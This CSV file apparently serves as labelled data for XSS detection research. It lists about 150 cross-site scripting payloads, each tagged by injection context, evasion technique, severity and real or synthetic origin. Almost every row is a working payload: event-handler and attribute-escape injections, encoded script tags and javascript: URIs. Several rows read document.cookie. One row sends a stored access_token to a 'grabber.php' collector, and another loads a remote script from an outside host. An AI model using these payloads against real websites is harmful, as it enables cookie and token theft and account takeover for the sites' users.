payload,context,technique,severity,length,source
%22 ontoggle=confirm(document.cookie) %22,attribute_escape,synthetic,medium,41,synthetic
"<frameset onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</frameset>",event_handler,none,medium,72,real
"""%3E%3Csvg onerror=prompt(location.hash)%3E",tag_injection,synthetic,medium,43,synthetic
"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",event_handler,none,medium,93,real
"""`'><script>\xE2\x80\x87javascript:alert(1)</script>",script_injection,none,medium,52,real
<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>,event_handler,none,medium,60,real
<[%00]img onerror=alert(1) src=a>,event_handler,url_encoding,medium,33,real
<svG oNmoUseOveR=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,46,synthetic
"<style>@keyframes x{}</style><command style=""animation-name:x"" onwebkitanimationend=""alert(1)""></command>",event_handler,none,medium,105,real
<option onpointerover=alert(1) style=display:block>AnonKryptiQuz</option>,event_handler,none,medium,73,real
<button popovertarget=x>Click me</button><img ontoggle=alert(1) popover id=x>AnonKryptiQuz</img>,event_handler,none,medium,96,real
"' onb&#101;gin=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,64,synthetic
""" oNmoUseEntEr=AleRt(DocUmeNt.CooKie) """,attribute_escape,synthetic,medium,39,synthetic
"<rt draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</rt>",event_handler,none,medium,80,real
"<strike oncontextmenu=""alert(1)"">AnonKryptiQuz</strike>",event_handler,none,medium,55,real
"<font oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
<svg onfocus=alert(location.hash)>,tag_injection,synthetic,medium,34,synthetic
"<main draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</main>",event_handler,none,medium,86,real
<img src=`%00`&NewLine; onerror=alert(7928)&NewLine;,event_handler,url_encoding,medium,52,real
"<em draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</em>",event_handler,none,medium,80,real
"<input oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"<xmp onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</xmp>",event_handler,none,medium,64,real
window.name='javascript:alert(23)';,js_uri,none,medium,35,real
""" onfocus=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape,synthetic,medium,55,synthetic
<!--*/!'*/!>%0D<svg/onload=confirm'1'//,event_handler,url_encoding,low,39,real
"<TABLE><TD BACKGROUND=""javascript:javascript:alert(1)"">",js_uri,case_variation,medium,55,real
"<map oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
"<script>throw onerror=alert,1</script>",script_injection,none,low,38,real
"""%3E%3Csvg onmouseover=prompt(location.hash)%3E",tag_injection,synthetic,medium,47,synthetic
"%22 onfocus=prompt(String.fromCharCode(88,83,83)) autofocus=%22",attribute_escape,synthetic,medium,63,synthetic
"<spacer onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</spacer>",event_handler,none,medium,65,real
' onclick=prompt(document.domain) ',attribute_escape,synthetic,medium,35,synthetic
"<a/href=""javascript%0A%0D:alert()"">",attribute_escape,url_encoding,medium,35,real
<svG oNtoGglE=cOnsOle.loG(lOcaTioN.hAsh)/>,tag_injection,synthetic,medium,42,synthetic
"<var onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</var>",event_handler,none,medium,67,real
"<header onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</header>",event_handler,none,medium,65,real
"<u onclick=""alert(1)"" style=display:block>AnonKryptiQuz</u>",event_handler,none,medium,59,real
"<embed draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",event_handler,none,medium,88,real
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",script_injection,case_variation,low,55,real
"<style>:target {color:red;}</style><animatemotion id=x style=""transition:color 1s"" ontransitionstart=alert(1)></animatemotion>",event_handler,none,medium,126,real
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76',js_uri,none,low,90,real
"<div draggable=""true"" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>",event_handler,none,medium,109,real
<legend onpointerleave=alert(1) style=display:block>AnonKryptiQuz</legend>,event_handler,none,medium,74,real
"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable style=display:block>drop here</font>",event_handler,none,medium,129,real
"<dir oncontextmenu=""alert(1)"">AnonKryptiQuz</dir>",event_handler,none,medium,49,real
"<applet id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></applet>",event_handler,none,medium,88,real
<element onpointerdown=alert(1) style=display:block>AnonKryptiQuz</element>,event_handler,none,medium,75,real
"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",attribute_escape,case_variation,medium,62,real
""" oNloAd=ConFirM('XSS') """,attribute_escape,synthetic,medium,25,synthetic
"<input TYPE=""IMAGE"" SRC=""javascript:document.vulnerable=true;"">",js_uri,none,low,63,real
"<style>@keyframes x{}</style><th style=""animation-name:x"" onwebkitanimationend=""alert(1)""></th>",event_handler,none,medium,95,real
"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",event_handler,none,medium,114,real
"<var onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</var>",event_handler,none,medium,65,real
"<svg onlo&#97;d=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,65,synthetic
"""%3E%3Csvg onmouseover=prompt(document.domain)%3E",tag_injection,synthetic,medium,49,synthetic
"<input4 draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</input4>",event_handler,none,medium,90,real
<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>,event_handler,none,medium,50,real
<multicol onblur=alert(1) tabindex=1 id=x></multicol><input autofocus>,event_handler,none,medium,70,real
<svG oNmoUseEntEr=AleRt(1)>,tag_injection,synthetic,medium,27,synthetic
"<progress onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",event_handler,none,medium,76,real
<embed onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</embed><input value=clickme>,event_handler,none,medium,110,real
"""><Svg onErrOr=AleRt(1)>",tag_injection,synthetic,medium,24,synthetic
"<center onclick=""alert(1)"" style=display:block>AnonKryptiQuz</center>",event_handler,none,medium,69,real
<span onpointerdown=alert(1) style=display:block>AnonKryptiQuz</span>,event_handler,none,medium,69,real
%27 onfocus=alert(document.cookie) %27,attribute_escape,synthetic,medium,38,synthetic
"<audio draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</audio>",event_handler,none,medium,68,real
<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>,event_handler,none,medium,82,real
"<footer draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</footer>",event_handler,none,medium,88,real
"<cite onclick=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",event_handler,none,medium,65,real
<button popovertarget=x>Click me</button><input3 ontoggle=alert(1) popover id=x>AnonKryptiQuz</input3>,event_handler,none,medium,102,real
"<keygen onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",event_handler,none,medium,65,real
<spacer onpointermove=alert(1) style=display:block>AnonKryptiQuz</spacer>,event_handler,none,medium,73,real
"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></del>",event_handler,none,medium,110,real
"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1)"">DEF",js_uri,none,medium,64,real
<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>,event_handler,none,medium,60,real
"<div draggable=""true"" contenteditable>drag me</div><br ondrop=alert(1) contenteditable>drop here</br>",event_handler,none,medium,101,real
<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,event_handler,none,medium,57,real
”/>&_lt;_script>alert(1)&_lt;/scr_ipt>”/>,generic,none,medium,41,real
<title onpointerenter=alert(1) style=display:block>AnonKryptiQuz</title>,event_handler,none,medium,72,real
<time onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</time><input value=clickme>,event_handler,none,medium,108,real
"%3Csvg ontoggle=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,61,synthetic
%3cscript%3ealert('XSS')%3c/script%3e,generic,url_encoding,medium,37,real
"<style>@keyframes x{}</style><img style=""animation-name:x"" onwebkitanimationend=""alert(1)""></img>",event_handler,none,medium,97,real
"<style>:target {color:red;}</style><optgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></optgroup>",event_handler,none,medium,114,real
' onerror=confirm(1) ',attribute_escape,synthetic,medium,22,synthetic
<command onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
<area onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</area><input value=clickme>,event_handler,none,medium,99,real
"<figure oncut=""alert(1)"" contenteditable>AnonKryptiQuz</figure>",event_handler,none,medium,63,real
"<xmp onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></xmp>",event_handler,none,medium,279,real
"<u draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</u>",event_handler,none,medium,75,real
"<listing onmouseup=""alert(1)"">AnonKryptiQuz</listing>",event_handler,none,medium,53,real
"<slot onmouseleave=""alert(1)"">AnonKryptiQuz</slot>",event_handler,none,medium,50,real
onmouseover=”alert(‘AnonKryptiQuz’),event_handler,none,medium,35,real
<nav onfocusout=alert(1) tabindex=1 id=x></nav><input autofocus>,event_handler,none,medium,64,real
"<dt onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dt>",event_handler,none,medium,80,real
<dialog onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</dialog>,event_handler,none,medium,78,real
%22><svg onload=console.log(location.hash)>,tag_injection,synthetic,medium,43,synthetic
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,event_handler,comment_injection,medium,60,real
<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>,event_handler,none,medium,57,real
"<s oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</s>",event_handler,none,medium,54,real
"<svg draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",event_handler,none,medium,79,real
<track onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</track>,event_handler,none,medium,76,real
"<style>@keyframes slidein {}</style><noembed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noembed>",event_handler,none,medium,168,real
<command onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</command><input value=clickme>,event_handler,none,medium,114,real
<button popovertarget=x>Click me</button><thead onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</thead>,event_handler,none,medium,106,real
"<noframes draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</noframes>",event_handler,none,medium,74,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style=""position:absolute;"" onanimationcancel=""print()""></datalist>",event_handler,none,low,185,real
"<code onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</code>",event_handler,none,medium,67,real
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,attribute_escape,comment_injection,medium,50,real
"<dt onmouseenter=""alert(1)"">AnonKryptiQuz</dt>",event_handler,none,medium,46,real
"'`""//><script>alert(1)</script>",script_injection,none,medium,31,real
""" oNbeGin=alErt('XSS') """,attribute_escape,synthetic,medium,24,synthetic
"'\u0029\u0028};alert(document.cookie);//""",dom_sink,unicode_escape,high,41,real
'te' < alert('<') < 'xt';,generic,none,medium,25,real
<svg onload=confirm(location.hash)/>,tag_injection,synthetic,medium,36,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style=""position:absolute;"" onanimationcancel=""print()""></colgroup>",event_handler,none,low,185,real
"&lt;A HREF=\""javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\""&gt;XSS&lt;/A&gt;",generic,html_entity,low,106,real
"<style>:target {color:red;}</style><kbd id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></kbd>",event_handler,none,medium,110,real
%22 ontoggle=prompt(document.cookie) %22,attribute_escape,synthetic,medium,40,synthetic
"""><iframe/src=""javascript:alert(1%26%23x00000000000000000000000000029;""></iframe>",js_uri,url_encoding,medium,81,real
"<pre draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</pre>",event_handler,none,medium,84,real
document.write(%22<img src=x onerror=alert(document.cookie)>%22),dom_sink,synthetic,medium,64,synthetic
"s = '""><script>alert(1)</script>' print 'eval(String.fromCharCode('+"","".join([str(ord(o)) for o in s])+'))'",script_injection,encoding,high,107,real
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onwebkitanimationend=""alert(1)""></thead>",event_handler,none,medium,101,real
"<style>:target {color:red;}</style><form id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></form>",event_handler,none,medium,112,real
player.swf?playerready=alert(document.cookie),dom_sink,none,high,45,real
%uff1cscript%uff1ealert(‘AnonKryptiQuz’);%uff1c/script%uff1e,generic,none,medium,60,real
"<script oncontextmenu=""alert(1)"">AnonKryptiQuz</script>",script_injection,none,medium,55,real
<svg onlo&#97;d=confirm(docum&#101;nt.cooki&#101;)>,tag_injection,synthetic,medium,51,synthetic
onerror=eval;throw'=alert\x2823\x29';,event_handler,none,low,37,real
<label onpointerenter=alert(1) style=display:block>AnonKryptiQuz</label>,event_handler,none,medium,72,real
"<div draggable=""true"" contenteditable>drag me</div><set ondrop=alert(1) contenteditable style=display:block>drop here</set>",event_handler,none,medium,123,real
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>,script_injection,none,low,109,real
<scRipT>//prOmpT(1)</ScrIpt>,script_injection,synthetic,medium,28,synthetic
"<kbd onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</kbd>",event_handler,none,medium,61,real
%22><svg onmouseenter=alert(location.hash)>,tag_injection,synthetic,medium,43,synthetic
"<applet onmouseover=""alert(1)"">AnonKryptiQuz</applet>",event_handler,none,medium,53,real
"<rb draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</rb>",event_handler,none,medium,82,real
<svg onb&#101;gin=consol&#101;.log(docum&#101;nt.cooki&#101;)>,tag_injection,synthetic,medium,62,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tfoot id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tfoot>",event_handler,none,medium,180,real
"<INPUT TYPE=""BUTTON"" action=""alert('XSS')""/>",attribute_escape,case_variation,medium,44,real
"""'`><\x00img src=xxx:x onerror=javascript:alert(3148)>",event_handler,none,medium,54,real
"<menuitem onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</menuitem>",event_handler,none,medium,73,real
"<svG oNtoGglE=aLerT(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,medium,51,synthetic
"<small oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</small>",event_handler,none,medium,62,real
<body onpopstate=alert(1)>,event_handler,none,medium,26,real
"<style>@keyframes slidein {}</style><small style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></small>",event_handler,none,medium,170,real
<script>/*/confirm('XSS')</script>,script_injection,synthetic,medium,34,synthetic
<svG oNloAd=ConFirM(1)/>,tag_injection,synthetic,medium,24,synthetic
